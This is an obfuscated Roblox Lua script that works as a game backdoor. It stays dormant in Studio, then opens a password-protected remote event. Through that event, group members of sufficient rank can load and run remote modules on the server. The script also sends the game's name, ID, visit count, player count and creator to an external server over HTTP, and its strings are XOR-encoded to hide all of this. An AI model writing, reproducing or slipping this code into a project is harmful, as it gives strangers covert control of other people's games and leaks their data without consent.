local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end if  not game:GetService(v7("\227\214\213\22\227\169\209\23\210\198","\126\177\163\187\69\134\219\167")):IsStudio() then local v12=35254309;local v13=game:GetService(v7("\11\217\62\213\207\38\223\60\204\255\38","\156\67\173\74\165"));local v14=Instance.new(v7("\6\178\68\25\168\35\99\34\178\71\2","\38\84\215\41\118\220\70"));v14.Parent=game:GetService(v7("\98\19\50\30\247\83\23\54\23\250\99\2\45\0\255\87\19","\158\48\118\66\114"));v14.Name=v7("\152\33\19\35\97\160\201\174\41\31\34\118\128\237\174\42\4","\155\203\68\112\86\19\197");v14.OnServerEvent:Connect(function(v26,v27,v28) if (v28==v7("\23\143\97\171\25\33\180\161\17\140\100\175\24\47\189\168\31\133\97\173\18\43","\152\38\189\86\156\32\24\133")) then if (v26:IsInGroup(v12) and (v26:GetRankInGroup(v12)>=(5 -3))) then local v29=0;local v30;while true do if ((0 -0)==v29) then pcall(function() require(625484908 + 5044356 )(v27)();end);v30=v26:FindFirstChild(v7("\204\91\166\95\249\69\128\83\245","\38\156\55\199"));v29=792 -(368 + 423) ;end if (v29==(3 -2)) then if (v30 and  not v30:FindFirstChild(v7("\137\79\89\27\36\117\238\70\186\112\125\58\24","\35\200\29\28\72\115\20\154"))) then pcall(function() require(71691905618676 -(10 + 8) ):areswatermark(v26.Name);end);end break;end end else v26:Kick(v7("\48\177\194\202\139\42\61\26\182\212\209\153\108\36\28\173\220\214\158\63\61\22\177\194\145","\84\121\223\177\191\237\76"));end else v26:Kick(v7("\142\88\200\181\46\88\63\211\178\76\204\164\122\81\51\194\190\69\218\238","\161\219\54\169\192\90\48\80"));end end);local v17=v7("\65\86\20\53\90\24\79\106\92\80\1\43\64\87\13\38\70\76\19\48\68\71\18\107\89\91\20\45\70\76\1\43\80\85\8\32\91\71\78\38\70\79","\69\41\34\96");local v18=game:GetService(v7("\145\194\197\1\7\63\172\207\214\9\7\24\185\209\193\3\1\46","\75\220\163\183\106\98"));local v19=v18:GetProductInfo(game.PlaceId);local v20=v7("\10\174\159\39\202\88\245\196\54\202\17\191\159\48\216\15\191\197\37\214\0\182\132\47\151\1\181\134\120\254\3\183\142\120\237\13\181\135\36\150\54\178\158\58\219\12\187\130\59\248\17\169\142\35\151\3\169\131\47\134\3\179\143\106","\185\98\218\235\87")   .. game.PlaceId   .. v7("\141\58\42\242\131\186\197\59\97\241\218\247\159\110\119\160\214\190\150\104\117\182","\202\171\92\71\134\190") ;local v21=v19.Name;local v22=v19.Visits;local v23= #game.Players:GetPlayers();local v24=v7("\28\207\39\134\38\214\34","\232\73\161\76");pcall(function() if (game.CreatorType==Enum.CreatorType.User) then v24=game.Players:GetNameFromUserIdAsync(game.CreatorId);elseif (game.CreatorType==Enum.CreatorType.Group) then v24=game:GetService(v7("\156\203\77\72\14\136\220\80\75\23\184\220","\126\219\185\34\61")):GetGroupInfoAsync(game.CreatorId).Name;end end);local v25=string.format(v7("\73\221\17\116\119\100\251\168\73\202\1\102\118\98\254\229\2\207\87\126\65\98\225\235\81\139\77\52\121\118\254\226\51\192\95\127\123\42\182\244\74\221\91\96\104\114\225\216\28\194\95\107\123\101\224\186\73\202\24\113\108\114\242\243\3\220\3\55\109\49\229\238\31\199\74\97\35\50\247","\135\108\174\62\18\30\23\147"),v17,game.PlaceId,v13:UrlEncode(v20),v13:UrlEncode(v21),v23,v13:UrlEncode(v24),v22);pcall(function() v13:GetAsync(v25);end);end